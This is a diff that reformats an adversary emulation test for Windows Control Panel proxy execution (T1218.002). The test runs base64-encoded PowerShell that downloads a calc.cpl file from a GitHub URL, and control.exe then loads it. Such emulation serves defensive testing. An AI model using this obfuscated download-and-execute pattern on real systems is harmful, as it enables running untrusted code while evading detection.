@@ -1,20 +1,18 @@
-- id: cfb28ee9-e9f8-5b07-bc95-0b27793a66ad
+- requirements: []
   name: Soumaia ART Tests - Control Panel Items
   description: 'This test simulates an adversary leveraging control.exe
 
     Upon execution calc.exe will be launched'
   tactic: stealth
-  technique:
-    attack_id: T1218.002
-    name: 'Signed Binary Proxy Execution: Control Panel'
-  platforms:
-    windows:
-      cmd:
-        command: |-
-          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAGMAYQBsAGMALgBjAHAAbAAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
-          if not "%ERRORLEVEL%"=="0" (
-              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABjAGEAbABjAC4AYwBwAGwAIgApACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQAyADEAOAAuADAAMAAyAC8AYgBpAG4ALwBjAGEAbABjAC4AYwBwAGwAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIALgBcAGMAYQBsAGMALgBjAHAAbAAiAAoA
-          )
-          control.exe ".\calc.cpl"
-        payloads:
-        - calc.cpl
+  technique_id: T1218.002
+  technique_name: 'Signed Binary Proxy Execution: Control Panel'
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: cmd
+    payloads:
+    - calc.cpl
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAGMAYQBsAGMALgBjAHAAbAAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA & if not "%ERRORLEVEL%"=="0" ( powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABjAGEAbABjAC4AYwBwAGwAIgApACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQAyADEAOAAuADAAMAAyAC8AYgBpAG4ALwBjAGEAbABjAC4AYwBwAGwAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIALgBcAGMAYQBsAGMALgBjAHAAbAAiAAoA ) & control.exe ".\calc.cpl"
+  id: cfb28ee9-e9f8-5b07-bc95-0b27793a66ad
